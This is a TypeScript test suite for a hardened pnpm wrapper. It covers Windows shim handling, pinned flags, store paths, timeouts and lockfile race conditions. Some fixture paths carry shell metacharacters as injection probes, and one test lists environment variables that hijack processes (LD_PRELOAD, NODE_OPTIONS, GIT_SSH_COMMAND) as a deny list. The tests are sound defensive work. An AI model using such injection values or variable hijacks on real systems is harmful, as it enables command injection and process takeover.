      await Fs.writeFile(NodePath.join(root, "pnpm-workspace.yaml"), "pnpmfile: hook.cjs\nglobalPnpmfile: hook.cjs\n")
      await Fs.writeFile(NodePath.join(root, ".pnpmfile.cjs"), "module.exports = { hooks: {} }\n")
      const manager = await makePnpm(root, executable)
      await Effect.runPromise(manager.fetch)
      await Effect.runPromise(manager.link)
      await Fs.writeFile(NodePath.join(root, ".pnpmfile.mjs"), "export const hooks = {}\n")
      await Effect.runPromise(manager.fetch)
      await Fs.rm(NodePath.join(root, ".pnpmfile.cjs"))
      await Fs.rm(NodePath.join(root, ".pnpmfile.mjs"))
      await Effect.runPromise(manager.fetch)
      const calls = (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
        .map((line) => JSON.parse(line) as Array<string>)
      const hooks = (args: Array<string>) => args.slice(args.indexOf("--reporter=append-only") + 1, -2)
      const pinned = (name: string) => ["--pnpmfile", `${root}/${name}`, "--global-pnpmfile="]
      expect(calls.map(hooks)).toEqual([
        pinned(".pnpmfile.cjs"),
        pinned(".pnpmfile.cjs"),
        pinned(".pnpmfile.mjs"),
        ["--ignore-pnpmfile"]
      ])
    })
  })

  it.each([false, true])(
    "refuses an unresolved Windows pnpm.cmd shim before spawning (shim present: %s)",
    async (present) => {
      await withFixture("package-manager-windows-shim", async (root) => {
        if (present) await Fs.writeFile(NodePath.join(root, "pnpm.cmd"), "@echo unresolved shim\n")
        const error = await Effect.runPromise(
          PackageManager.makePnpm({
            requirement: "11.21.0",
            projectRoot: root,
            environment: { Path: root }
          }).pipe(
            Effect.flatMap((manager) => manager.version),
            Effect.flip,
            Effect.provide(ExecutableFixture.layer),
            Effect.provide(windowsRuntimeLayer)
          )
        )
        expect(error.code).toBe("environment_mismatch")
        expect(error.message).toContain("pnpm.cmd")
      })
    }
  )

  it("resolves Windows pnpm.cmd to JavaScript and preserves literal arguments without a shell", async () => {
    await withFixture("package-manager-windows & %PATH% ^", async (root) => {
      const bin = NodePath.join(root, "bin & %PATH% ^")
      const entry = NodePath.join(bin, "node_modules/pnpm/bin/pnpm.cjs")
      await Fs.mkdir(NodePath.dirname(entry), { recursive: true })
      await Fs.writeFile(NodePath.join(bin, "pnpm.cmd"), "@echo shim must never execute\n")
      await Fs.writeFile(
        entry,
        `
        require("node:fs").appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")
        if (process.argv[2] === "--version") process.stdout.write("11.21.0\\n")
      `
      )
      const manager = await Effect.runPromise(
        PackageManager.makePnpm({
          requirement: "11.21.0",
          projectRoot: root,
          executable: "pnpm",
          environment: { Path: `${root}/absent;"${bin}"`, SystemRoot: process.env.SystemRoot }
        }).pipe(
          Effect.provide(ExecutableFixture.layer),
          Effect.provide(Runtime.layerNoop("node", {
            requirement: ">=22.19.0",
            version: "24.9.0",
            executable: process.execPath,
            platform: { ...platform, os: "win32" }
          }))
        )
      )
      expect(await Effect.runPromise(manager.verify)).toBe("11.21.0")
      await Effect.runPromise(manager.fetch)
      await Effect.runPromise(manager.link)
      const calls = (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
        .map((line) => JSON.parse(line) as Array<string>)
      expect(calls).toEqual([
        ["--version"],
        [
          "fetch",
          "--frozen-lockfile",
          "--ignore-scripts",
          "--reporter=append-only",
          "--ignore-pnpmfile",
          "--store-dir",
          `${root}/.flows/store/pnpm`
        ],
        [
          "install",
          "--offline",
          "--frozen-lockfile",
          "--ignore-scripts",
          "--reporter=append-only",
          "--ignore-pnpmfile",
          "--store-dir",
          `${root}/.flows/store/pnpm`
        ]
      ])
    })
  })

  it.each(["%~dp0\\", "%dp0%\\"])("follows a pnpm self-update shim (%s) without invoking a shell", async (prefix) => {
    await withFixture("package-manager-updated & %PATH% ^", async (root) => {
      const bin = NodePath.join(root, "bin")
      const entry = NodePath.join(root, ".tools/pnpm/11.25.0/node_modules/pnpm/bin/pnpm.mjs")
      await Fs.mkdir(NodePath.dirname(entry), { recursive: true })
      await Fs.mkdir(NodePath.join(bin, "node_modules/pnpm/bin"), { recursive: true })
      await Fs.writeFile(NodePath.join(bin, "node_modules/pnpm/bin/pnpm.cjs"), "throw new Error('stale adjacent pnpm')")
      await Fs.writeFile(entry, "process.stdout.write('11.25.0')")
      const target = `${prefix}..\\.tools\\pnpm\\11.25.0\\node_modules\\pnpm\\bin\\pnpm.mjs`
      await Fs.writeFile(
        NodePath.join(bin, "pnpm.cmd"),
        [
          "@SETLOCAL",
          `@IF EXIST "${prefix}node.exe" (`,
          `  "${prefix}node.exe"  "${target}" %*`,
          ") ELSE (",
          "  @SET PATHEXT=%PATHEXT:;.JS;=;%",
          `  node  "${target}" %*`,
          ")"
        ].join("\r\n")
      )
      const version = await Effect.runPromise(
        PackageManager.makePnpm({
          requirement: "11.25.0",
          projectRoot: root,
          environment: { Path: `"${bin}"` }
        }).pipe(
          Effect.flatMap((manager) => manager.verify),
          Effect.provide(ExecutableFixture.layer),
          Effect.provide(
            Runtime.layerNoop("node", {
              requirement: ">=22.19.0",
              version: "24.9.0",
              executable: process.execPath,
              platform: { ...platform, os: "win32" }
            })
          )
        )
      )
      expect(version).toBe("11.25.0")
    })
  })

  it.each(["missing", "directory", "ambiguous"])(
    "refuses a %s target on the first shim instead of using a later version",
    async (kind) => {
      await withFixture("package-manager-first-shim", async (root) => {
        const later = NodePath.join(root, "later")
        await Fs.mkdir(later)
        await Fs.writeFile(NodePath.join(later, "pnpm.cmd"), "@node \"%~dp0\\pnpm.mjs\" %*")
        await Fs.writeFile(NodePath.join(later, "pnpm.mjs"), "process.stdout.write('11.25.0')")
        await Fs.writeFile(
          NodePath.join(root, "pnpm.cmd"),
          "@node \"%~dp0\\pnpm.mjs\" %*" +
            (kind === "ambiguous" ? "\n@node \"%~dp0\\other/pnpm.mjs\" %*" : "")
        )
        if (kind === "directory") await Fs.mkdir(NodePath.join(root, "pnpm.mjs"))
        const error = await Effect.runPromise(
          PackageManager.makePnpm({
            requirement: "11.25.0",
            projectRoot: root,
            environment: { Path: `${root};${later}` }
          }).pipe(
            Effect.flatMap((manager) => manager.version),
            Effect.flip,
            Effect.provide(ExecutableFixture.layer),
            Effect.provide(windowsRuntimeLayer)
          )
        )
        expect(error.code).toBe("environment_mismatch")
        expect(error.message).toContain(`${root}/pnpm.cmd`)
      })
    }
  )

  it.each(["fetch", "link"] as const)("verifies before a direct public %s can mutate", async (operation) => {
    await withFixture("package-manager-direct-verify", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(
        executable,
        `
        import { appendFileSync } from "node:fs"
        appendFileSync("calls", process.argv[2] + "\\n")
        if (process.argv[2] === "--version") process.stdout.write("1.0.0\\n")
      `
      )
      const manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager[operation])).rejects.toMatchObject({ code: "environment_mismatch" })
      expect(await Fs.readFile(NodePath.join(root, "calls"), "utf8")).toBe("--version\n")
    })
  })

  it("memoizes manager probes and the npmrc read per service instance", async () => {
    await withFixture("package-manager-cached", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "registry=https://registry.example/\n")
      await writeExecutable(
        executable,
        `
        import { appendFileSync } from "node:fs"
        appendFileSync("calls", process.argv[2] + "\\n")
        if (process.argv[2] === "--version") process.stdout.write("11.21.0\\n")
      `
      )
      const fs = await Effect.runPromise(FileSystem.FileSystem.pipe(Effect.provide(ExecutableFixture.layer)))
      let reads = 0
      const layer = PackageManager.layerPnpm({
        requirement: "11.21.0",
        projectRoot: root,
        executable,
        environment: process.env
      })
      const use = Effect.gen(function*() {
        const manager = yield* PackageManager.PackageManager
        yield* Effect.all([manager.version, manager.verify], { concurrency: "unbounded" })
        yield* manager.verify
        yield* manager.fetch
        yield* manager.verify
        yield* manager.link
      }).pipe(
        Effect.provide(layer),
        Effect.provideService(FileSystem.FileSystem, {
          ...fs,
          open: (path, options) =>
            fs.open(path, options).pipe(Effect.tap(() =>
              Effect.sync(() => {
                reads += 1
              })
            ))
        }),
        Effect.provide(ExecutableFixture.layer),
        Effect.provide(runtimeLayer)
      )
      await Effect.runPromise(use)
      expect.soft(reads).toBe(1)
      expect.soft(await Fs.readFile(NodePath.join(root, "calls"), "utf8")).toBe("--version\nfetch\ninstall\n")
      await Effect.runPromise(use)
      expect(reads).toBe(2)
      expect(await Fs.readFile(NodePath.join(root, "calls"), "utf8")).toBe("--version\nfetch\ninstall\n".repeat(2))
    })
  })

  /**
   * Accepting a Windows name into the lookup source does not put it on a child.
   * Only the bootstrap list and the names a `.npmrc` references are selected
   * from the source, and both are portable by construction, so what the manager
   * spawns with stays a POSIX-named environment on every host.
   */
  it("never forwards a non-portable ambient name into the child environment", async () => {
    await withFixture("package-manager-windows-env", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(executable, "process.stdout.write(JSON.stringify(Object.keys(process.env)))")
      const manager = await Effect.runPromise(
        PackageManager.makePnpm({
          requirement: "11.21.0",
          projectRoot: root,
          executable,
          environment: {
            // One absolute entry: a relative PATH entry is dropped before spawning.
            Path: NodePath.dirname(process.execPath),
            "ProgramFiles(x86)": "C:\\Program Files (x86)",
            "CommonProgramFiles(x86)": "C:\\Program Files (x86)\\Common Files"
          }
        }).pipe(Effect.provide(ExecutableFixture.layer), Effect.provide(windowsRuntimeLayer))
      )
      const names = JSON.parse(await Effect.runPromise(manager.version)) as ReadonlyArray<string>
      expect(names.filter((name) => !/^[A-Za-z_][A-Za-z0-9_]*$/.test(name))).toEqual([])
      expect(names).toContain("PATH")
    })
  })

  it("bounds a hanging package-manager version probe", async () => {
    await withFixture("package-manager-version-timeout", async (root) => {
      const executable = NodePath.join(root, "hanging.mjs")
      await writeExecutable(executable, "setInterval(() => {}, 1000)")
      const manager = await makePnpm(root, executable, { timeoutMs: 100 })
      const error = await Effect.runPromise(Effect.flip(manager.version))
      expect(error.code).toBe("command_failed")
      expect(error.message).toContain("did not finish within 100ms")
    })
  })

  it("pins pnpm fetch to the canonical project store and non-mutating flags", async () => {
    await withFixture("package-manager-fetch-args", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      const invocation = NodePath.join(root, "invocation.json")
      await writeExecutable(
        executable,
        `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
          `import { writeFileSync } from "node:fs"\nwriteFileSync(${
            JSON.stringify(invocation)
          }, JSON.stringify(process.argv.slice(2)))`
      )
      const manager = await makePnpm(root, executable)
      await Effect.runPromise(manager.fetch)
      const args: Array<string> = JSON.parse(await Fs.readFile(invocation, "utf8"))
      expect(args.slice(0, -1)).toEqual([
        "fetch",
        "--frozen-lockfile",
        "--ignore-scripts",
        "--reporter=append-only",
        "--ignore-pnpmfile",
        "--store-dir"
      ])
      expect(NodePath.resolve(args.at(-1)!)).toBe(NodePath.join(root, ".flows/store/pnpm"))
    })
  })

  it("points fetch and link at a shared host store when one is named", async () => {
    await withFixture("package-manager-host-store", async (root) => {
      const store = await Fs.realpath(await Fs.mkdtemp(NodePath.join(Os.tmpdir(), "smthrs-shared-store-")))
      try {
        const executable = NodePath.join(root, "pnpm.mjs")
        await writeExecutable(
          executable,
          `import { appendFileSync } from "node:fs"\n` +
            `if (process.argv[2] === "--version") { process.stdout.write("11.21.0\\n"); process.exit(0) }\n` +
            `appendFileSync("calls", JSON.stringify(process.argv.slice(2)) + "\\n")`
        )
        const manager = await makePnpm(root, executable, { storeDirectory: store })
        expect(manager.storeDirectory).toBe(store)
        await Effect.runPromise(manager.fetch)
        await Effect.runPromise(manager.link)
        const calls = (await Fs.readFile(NodePath.join(root, "calls"), "utf8")).trim().split("\n")
          .map((line) => JSON.parse(line) as Array<string>)
        expect(calls).toEqual([
          [
            "fetch",
            "--frozen-lockfile",
            "--ignore-scripts",
            "--reporter=append-only",
            "--ignore-pnpmfile",
            "--store-dir",
            store
          ],
          [
            "install",
            "--offline",
            "--frozen-lockfile",
            "--ignore-scripts",
            "--reporter=append-only",
            "--ignore-pnpmfile",
            "--store-dir",
            store
          ]
        ])
      } finally {
        await Fs.rm(store, { recursive: true, force: true })
      }
    })
  })

  it.each([
    ["", /storeDirectory must be a usable absolute path/],
    [".flows/store/pnpm", /storeDirectory must be a usable absolute path/],
    ["/shared/store\u0000", /storeDirectory must be a usable absolute path/]
  ])("refuses a store directory that is not a usable absolute path: %j", (storeDirectory, message) => {
    expect(() =>
      PackageManager.makeNoop(
        "pnpm",
        { requirement: "11.21.0", projectRoot: "/workspace", storeDirectory },
        platform
      )
    ).toThrow(message)
  })

  it("refuses a store directory inside the project root", () => {
    expect(() =>
      PackageManager.makeNoop(
        "pnpm",
        { requirement: "11.21.0", projectRoot: "/workspace", storeDirectory: "/workspace/.flows/store/pnpm" },
        platform
      )
    ).toThrow(/storeDirectory must be outside the project root/)
  })

  it.each([
    "BASH_ENV",
    "BUN_INSTALL",
    "CDPATH",
    "COREPACK_ROOT",
    "DENO_DIR",
    "DYLD_INSERT_LIBRARIES",
    "ENV",
    "GIT_SSH_COMMAND",
    "GLOBIGNORE",
    "LD_PRELOAD",
    "NODE_OPTIONS",
    "NPM_CONFIG_REGISTRY",
    "PNPM_HOME",
    "SHELLOPTS",
    "ld_preload"
  ])("refuses .npmrc references that can mutate the child runtime: %s", async (name) => {
    await withFixture("package-manager-env-control", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await Fs.writeFile(NodePath.join(root, ".npmrc"), `//registry.example/:_authToken=\${${name}}\n`, "utf8")
      await writeExecutable(executable, "process.stdout.write('9.15.0\\n')")
      const manager = await makePnpm(root, executable, {
        environment: { PATH: process.env.PATH, [name]: "test-control-value" }
      })
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(
        `process-control environment variable ${name}`
      )
    })
  })

  it("refuses literal credentials in project configuration before spawning", async () => {
    await withFixture("package-manager-literal-token", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      const marker = NodePath.join(root, "spawned")
      await Fs.writeFile(NodePath.join(root, ".npmrc"), "//registry.example/:_authToken=secret\n", "utf8")
      await writeExecutable(
        executable,
        `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "yes")`
      )
      const manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/embeds a credential/)
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })

  it("bounds and strictly decodes project configuration before spawning", async () => {
    await withFixture("package-manager-npmrc-bounds", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(executable, "process.stdout.write('9.15.0\\n')")
      const manager = await makePnpm(root, executable)

      await Fs.writeFile(
        NodePath.join(root, ".npmrc"),
        Buffer.alloc(PackageManager.maximumNpmrcBytes + 1, 0x61)
      )
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/no larger than/)

      await Fs.writeFile(NodePath.join(root, ".npmrc"), Buffer.from([0xff]))
      const fresh = await makePnpm(root, executable)
      await expect(Effect.runPromise(fresh.version)).rejects.toThrow(/not valid UTF-8/)

      const atBound = `# ${"a".repeat(PackageManager.maximumNpmrcBytes - 3)}\n`
      expect(Buffer.byteLength(atBound, "utf8")).toBe(PackageManager.maximumNpmrcBytes)
      await Fs.writeFile(NodePath.join(root, ".npmrc"), atBound, "utf8")
      const bounded = await makePnpm(root, executable)
      expect(await Effect.runPromise(bounded.version)).toBe("9.15.0")
    })
  })

  it("refuses project inputs that resolve outside the project root", async () => {
    await withFixture("package-manager-outside-input", async (root) => {
      const outside = await Fs.mkdtemp(NodePath.join(Os.tmpdir(), "smthrs-outside-input-"))
      try {
        const executable = NodePath.join(root, "pnpm.mjs")
        const marker = NodePath.join(root, "spawned")
        await writeExecutable(
          executable,
          `import { writeFileSync } from "node:fs"\nwriteFileSync(${JSON.stringify(marker)}, "yes")`
        )
        await Fs.writeFile(NodePath.join(outside, "npmrc"), "registry=https://example.test\n", "utf8")
        await Fs.symlink(NodePath.join(outside, "npmrc"), NodePath.join(root, ".npmrc"))
        const manager = await makePnpm(root, executable)

        await expect(Effect.runPromise(manager.version)).rejects.toThrow(/resolves outside project root/)
        await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
      } finally {
        await Fs.rm(outside, { recursive: true, force: true })
      }
    })
  })

  it("requires a successful, bounded, single-line version response", async () => {
    await withFixture("package-manager-version", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")

      await writeExecutable(executable, "process.exitCode = 23")
      let manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/exited with status 23/)

      await writeExecutable(
        executable,
        `process.stdout.write(Buffer.alloc(${PackageManager.maximumVersionOutputBytes + 1}, 0x61))`
      )
      manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/version output exceeds/)

      await writeExecutable(executable, "process.stdout.write('9.15.0\\nunexpected\\n')")
      manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/more than one line/)

      await writeExecutable(executable, "process.stdout.write(Buffer.from([0xff]))")
      manager = await makePnpm(root, executable)
      await expect(Effect.runPromise(manager.version)).rejects.toThrow(/not valid UTF-8/)
    })
  })

  it("reports each package-manager operation's nonzero exit without reporting a successful install", async () => {
    await withFixture("package-manager-operation-exit", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(
        executable,
        `if (process.argv[2] === "--version") process.stdout.write("11.21.0\\n")\n` +
          `else if (process.argv[2] === "fetch") process.exitCode = 7\n` +
          `else if (process.argv[2] === "install") process.exitCode = 9`
      )
      const manager = await makePnpm(root, executable)
      const fetch = await Effect.runPromise(Effect.flip(manager.fetch))
      const link = await Effect.runPromise(Effect.flip(manager.link))
      expect(fetch.code).toBe("command_failed")
      expect(fetch.message).toBe("pnpm fetch exited with status 7")
      expect(link.code).toBe("command_failed")
      expect(link.message).toBe("pnpm install --offline exited with status 9")
    })
  })

  it("interrupts a package-manager command that exceeds its deadline", async () => {
    await withFixture("package-manager-timeout", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      await writeExecutable(
        executable,
        "if (process.argv[2] === \"--version\") { process.stdout.write(\"11.21.0\\n\"); process.exit(0) }\n" +
          "setInterval(() => {}, 1_000)"
      )
      // The version probe uses the same timeoutMs, so it must leave node room
      // to start on a slow host; the label proves fetch itself timed out.
      const manager = await makePnpm(root, executable, { timeoutMs: 2_000 })
      await expect(Effect.runPromise(manager.fetch)).rejects.toThrow(/^pnpm fetch did not finish within 2000ms$/)
    })
  })

  it("kills package-manager descendants when a command times out", async () => {
    await withFixture("package-manager-timeout-tree", async (root) => {
      const executable = NodePath.join(root, "pnpm.mjs")
      const started = NodePath.join(root, "descendant-started")
      const marker = NodePath.join(root, "descendant-survived")
      const child = `require("node:fs").writeFileSync(${JSON.stringify(started)}, "yes"); ` +
        `setTimeout(() => require("node:fs").writeFileSync(${JSON.stringify(marker)}, "yes"), 2_700)`
      await writeExecutable(
        executable,
        "if (process.argv[2] === \"--version\") { process.stdout.write(\"11.21.0\\n\"); process.exit(0) }\n" +
          "import { spawn } from \"node:child_process\"\n" +
          `spawn(process.execPath, ["-e", ${JSON.stringify(child)}], { stdio: "ignore" })\n` +
          "setInterval(() => {}, 1_000)"
      )
      const manager = await makePnpm(root, executable, { timeoutMs: 2_000 })
      await expect(Effect.runPromise(manager.fetch)).rejects.toThrow(/^pnpm fetch did not finish within 2000ms$/)
      await new Promise((resolve) => setTimeout(resolve, 1_500))
      // The descendant ran before the deadline, so its absent marker proves it was killed.
      await expect(Fs.stat(started)).resolves.toBeDefined()
      await expect(Fs.stat(marker)).rejects.toMatchObject({ code: "ENOENT" })
    })
  })
})

/**
 * The real Node filesystem, with a hook that runs after one operation.
 *
 * `boundedBytes` re-checks the file's identity across `stat`, `open`, the read
 * loop, and `realPath`, because a lockfile that changes mid-read would be
 * digested as something it never was. Those checks are only observable if
 * something mutates the file at the exact point between two of them, so this
 * wraps the real service and performs a real mutation there. Nothing about the
 * filesystem's behaviour is simulated: every call still goes to the host.
 */
const hookedFileSystem = async (
  hooks: {
    readonly afterStat?: () => Promise<void>
    readonly afterOpen?: () => Promise<void>
    readonly afterDescriptorStat?: () => Promise<void>
  }
): Promise<FileSystem.FileSystem> => {
  const real = await Effect.runPromise(
    Effect.gen(function*() {
      return yield* FileSystem.FileSystem
    }).pipe(Effect.provide(ExecutableFixture.layer))
  )
  const once = (hook: (() => Promise<void>) | undefined) => {
    let fired = false
    return Effect.promise(async () => {
      if (fired || hook === undefined) return
      fired = true
      await hook()
    })
  }
  const afterStat = once(hooks.afterStat)
  const afterOpen = once(hooks.afterOpen)
  const afterDescriptorStat = once(hooks.afterDescriptorStat)
  // A `File` keeps its state on the prototype, so the descriptor hook delegates
  // through a proxy rather than through a spread that would drop it.
  const observed = (file: FileSystem.File): FileSystem.File =>
    hooks.afterDescriptorStat === undefined ? file : new Proxy(file, {
      get: (target, property) => {
        const value = Reflect.get(target, property, target)
        if (property === "stat") {
          return (value as Effect.Effect<unknown, unknown>).pipe(Effect.tap(() => afterDescriptorStat))
        }
        return typeof value === "function" ? value.bind(target) : value
      }
    })
  return {
    ...real,
    stat: (path) => real.stat(path).pipe(Effect.tap(() => afterStat)),
    open: (path, options) => real.open(path, options).pipe(Effect.tap(() => afterOpen), Effect.map(observed))
  }
}

const digestOver = (fileSystem: FileSystem.FileSystem, root: string) =>
  Effect.runPromise(
    PackageManager.lockfileDigest(root, "pnpm-lock.yaml").pipe(
      Effect.flip,
      Effect.provideService(FileSystem.FileSystem, fileSystem),
      Effect.provide(ExecutableFixture.layer)
    )
  )

describe("PackageManager file reads", () => {
  it("turns failures at each file-read stage into a typed refusal", async () => {
    await withFixture("package-manager-read-faults", async (root) => {
      await Fs.writeFile(NodePath.join(root, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n", "utf8")
      const real = await Effect.runPromise(
        Effect.gen(function*() {
          return yield* FileSystem.FileSystem
        }).pipe(Effect.provide(ExecutableFixture.layer))
      )
      for (
        const phase of [
          "initial-root-path",
          "pre-open-stat",
          "open",
          "descriptor-stat",
          "descriptor-read",
          "final-descriptor-stat",
          "final-file-path",
          "final-root-path"
        ] as const
      ) {
        const fault = PlatformError.systemError({
          _tag: "PermissionDenied",
          module: "FileSystem",
          method: phase,
          description: `injected ${phase} failure`
        })
        let realPaths = 0
        let descriptorStats = 0
        const observed = (file: FileSystem.File): FileSystem.File =>
          new Proxy(file, {
            get: (target, property) => {
              const value = Reflect.get(target, property, target)
              if (property === "stat") {
                descriptorStats += 1
                return phase === "descriptor-stat" && descriptorStats === 1 ||
                    phase === "final-descriptor-stat" && descriptorStats === 2
                  ? Effect.fail(fault)
                  : value
              }
              if (property === "read" && phase === "descriptor-read") {
                return () => Effect.fail(fault)
              }
              return typeof value === "function" ? value.bind(target) : value
            }
          })
        const fileSystem: FileSystem.FileSystem = {
          ...real,
          realPath: (path) => {
            realPaths += 1
            return phase === "initial-root-path" && realPaths === 1 ||
                phase === "final-file-path" && realPaths === 3 ||
                phase === "final-root-path" && realPaths === 4
              ? Effect.fail(fault)
              : real.realPath(path)
          },
          stat: (path) => phase === "pre-open-stat" ? Effect.fail(fault) : real.stat(path),
          open: (path, options) =>
            phase === "open" ? Effect.fail(fault) : real.open(path, options).pipe(Effect.map(observed))
        }
        const error = await digestOver(fileSystem, root)
        expect(error.code, phase).toBe("lockfile_unreadable")
        expect(error.message, phase).toContain(fault.message)
        expect(error.cause?.name, phase).toBe("PlatformError")
      }
    })
  })

  it("refuses invalid byte counts from a file reader instead of hashing partial content", async () => {
    await withFixture("package-manager-invalid-read-count", async (root) => {
      await Fs.writeFile(NodePath.join(root, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n", "utf8")
      const real = await Effect.runPromise(
        Effect.gen(function*() {
          return yield* FileSystem.FileSystem
        }).pipe(Effect.provide(ExecutableFixture.layer))
      )
      for (const reported of [-1, 1.5, Number.NaN, Number.MAX_SAFE_INTEGER]) {
        const fileSystem: FileSystem.FileSystem = {
          ...real,
          open: (path, options) =>
            real.open(path, options).pipe(Effect.map((file) =>
              new Proxy(file, {
                get: (target, property) => {
                  const value = Reflect.get(target, property, target)
                  return property === "read"
                    ? () => Effect.succeed(reported as never)
                    : typeof value === "function"
                    ? value.bind(target)
                    : value
                }
              })
            ))
        }
        const error = await digestOver(fileSystem, root)
        expect(error.code, String(reported)).toBe("lockfile_unreadable")
        expect(error.message, String(reported)).toContain("file returned an invalid read length")
      }
    })
  })

  it("refuses a lockfile beneath a project root that no longer exists", async () => {
    await withFixture("package-manager-removed-root", async (root) => {
      const removed = NodePath.join(root, "removed")
      const error = await Effect.runPromise(
        PackageManager.lockfileDigest(removed, "pnpm-lock.yaml").pipe(
          Effect.flip,
          Effect.provide(ExecutableFixture.layer)
        )
      )
      expect(error.code).toBe("lockfile_unreadable")
      expect(error.message).toContain(removed)
      expect(error.cause?.code).toBe("ENOENT")
    })
  })

  it("refuses invalid UTF-8 in the project configuration before calculating a digest", async () => {
    await withFixture("package-manager-invalid-utf8", async (root) => {
      await Fs.writeFile(NodePath.join(root, ".npmrc"), new Uint8Array([0x72, 0x65, 0xff]))
      const error = await Effect.runPromise(
        PackageManager.npmrcDigest(root).pipe(Effect.flip, Effect.provide(ExecutableFixture.layer))
      )
      expect(error.code).toBe("manifest_unreadable")
      expect(error.message).toMatch(/could not read .*\.npmrc/)
    })
  })

  it("refuses a directory at .npmrc", async () => {
    await withFixture("package-manager-npmrc-directory", async (root) => {
      await Fs.mkdir(NodePath.join(root, ".npmrc"))
      await expect(Effect.runPromise(
        PackageManager.npmrcDigest(root).pipe(Effect.provide(ExecutableFixture.layer))
      )).rejects.toThrow(/expected a regular file/)
    })
  })

  it.skipIf(process.platform === "win32")("refuses a FIFO lockfile before opening it", async () => {
    await withFixture("package-manager-lockfile-fifo", async (root) => {
      execFileSync("mkfifo", [NodePath.join(root, "pnpm-lock.yaml")], { timeout: 5_000 })
      await expect(Effect.runPromise(
        PackageManager.lockfileDigest(root, "pnpm-lock.yaml").pipe(Effect.provide(ExecutableFixture.layer))
      )).rejects.toThrow(/expected a regular file/)
    })
  }, 5_000)

  it.skipIf(process.platform === "win32")("refuses a directory swapped in before opening a lockfile", async () => {
    await withFixture("package-manager-lockfile-directory-swap", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      const fileSystem = await hookedFileSystem({
        afterStat: async () => {
          await Fs.rm(lockfile)
          await Fs.mkdir(lockfile)
        }
      })
      const error = await digestOver(fileSystem, root)
      expect(error.code).toBe("lockfile_unreadable")
      expect(error.message).toMatch(/expected a regular file/)
    })
  })

  it.skipIf(process.platform === "win32")(
    "refuses a FIFO swapped in after stat without waiting for a writer",
    async () => {
      await withFixture("package-manager-lockfile-fifo-swap", async (root) => {
        const lockfile = NodePath.join(root, "pnpm-lock.yaml")
        await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
        // The bound starts once the FIFO exists, so a slow `mkfifo` on a loaded
        // host cannot be mistaken for a blocked open.
        let swapped!: () => void
        const fifoReady = new Promise<void>((resolve) => {
          swapped = resolve
        })
        const fileSystem = await hookedFileSystem({
          afterStat: async () => {
            await Fs.rename(lockfile, NodePath.join(root, "regular"))
            execFileSync("mkfifo", [lockfile], { timeout: 5_000 })
            swapped()
          }
        })
        const digest = digestOver(fileSystem, root)
        try {
          const outcome = await Promise.race([
            digest,
            fifoReady.then(() => new Promise<"blocked">((resolve) => setTimeout(() => resolve("blocked"), 2_000)))
          ])
          expect(outcome).not.toBe("blocked")
          const error = outcome as PackageManager.PackageManagerError
          expect(error.code).toBe("lockfile_unreadable")
          expect(error.message).toMatch(/expected a regular file/)
        } finally {
          // A regressed open waits for a writer: open one without blocking so the
          // pending read, and this fixture, always finish.
          await Fs.open(lockfile, NodeFs.constants.O_WRONLY | NodeFs.constants.O_NONBLOCK).then(
            (writer) => writer.close(),
            () => undefined
          )
          await digest
        }
      })
    },
    10_000
  )

  it("refuses a lockfile removed between the stat and the open", async () => {
    await withFixture("package-manager-lockfile-vanished", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      const fileSystem = await hookedFileSystem({ afterStat: () => Fs.rm(lockfile) })
      const error = await digestOver(fileSystem, root)
      expect(error.code).toBe("lockfile_unreadable")
      expect(error.message).toContain("pnpm-lock.yaml")
    })
  })

  it("refuses a lockfile whose inode is replaced between the stat and the open", async () => {
    await withFixture("package-manager-inode-swap", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      const replacement = NodePath.join(root, "replacement")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      await Fs.writeFile(replacement, "lockfileVersion: '8.0'\n", "utf8")
      const fileSystem = await hookedFileSystem({ afterStat: () => Fs.rename(replacement, lockfile) })
      const error = await digestOver(fileSystem, root)
      expect(error.code).toBe("lockfile_unreadable")
      expect(error.message).toMatch(/file changed while it was opened/)
    })
  })

  it("refuses a lockfile that grows after it was opened", async () => {
    await withFixture("package-manager-grow", async (root) => {
      const lockfile = NodePath.join(root, "pnpm-lock.yaml")
      await Fs.writeFile(lockfile, "lockfileVersion: '9.0'\n", "utf8")
      const fileSystem = await hookedFileSystem({
        afterDescriptorStat: () => Fs.appendFile(lockfile, "packages: {}\n", "utf8")
      })
      const error = await digestOver(fileSystem, root)
      expect(error.message).toMatch(/file length changed while it was read/)
    })
  })

